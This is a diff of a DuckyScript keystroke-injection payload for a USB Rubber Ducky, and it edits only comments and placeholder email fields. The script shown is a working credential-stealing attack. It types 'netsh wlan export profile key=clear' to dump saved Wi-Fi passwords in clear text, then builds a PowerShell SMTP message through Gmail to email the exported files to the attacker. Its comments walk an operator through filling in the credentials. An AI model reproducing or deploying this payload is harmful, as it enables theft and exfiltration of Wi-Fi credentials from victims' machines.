@@ -24,7 +24,7 @@ DELAY 100
 ENTER
 DELAY 100
 REM this command will export the profiles with the passwords in clear text
-REM each profile will be exported to a seperate .xml file, we will soon concatanate all these files
+REM each profile will be exported to a seperate .xml file, the files will be concatanated later in script
 STRING netsh wlan export profile key=clear
 DELAY 200
 ENTER
@@ -52,16 +52,16 @@ DELAY 100
 STRING $emailSmtpServerPort = @587@;
 DELAY 100
 REM change the emailSmtpUser and Pass to your gmail username and passoword...delete the <>
-STRING $emailSmtpUser = @< your email here w/out '@gmail.com' >"gmail.com@;
+STRING $emailSmtpUser = @< your email here w/out gmail.com extension >"gmail.com@;
 DELAY 100
 STRING $emailSmtpPass = @< your email password here >@;
 DELAY 100
 STRING $emailMessage = New-Object System.Net.Mail.MailMessage;
 DELAY 100
 REM add the desired email address to send to..IMPORTANT leave the outer <> delete the inner <> once inserted
-STRING $emailMessage.From = @Ducky420 << your email here w/out '@gmail.com' >"gmail.com>@;
+STRING $emailMessage.From = @Ducky420 << your email here w/out gmail.com extension' >"gmail.com>@;
 DELAY 100
-STRING $emailMessage.To.Add(@< your email here w/out '@gmail.com' >"gmail.com@);
+STRING $emailMessage.To.Add(@< your email here w/out gmail.com extension' >"gmail.com@);
 DELAY 100
 STRING $emailMessage.Body = @See attachments@;
 DELAY 100
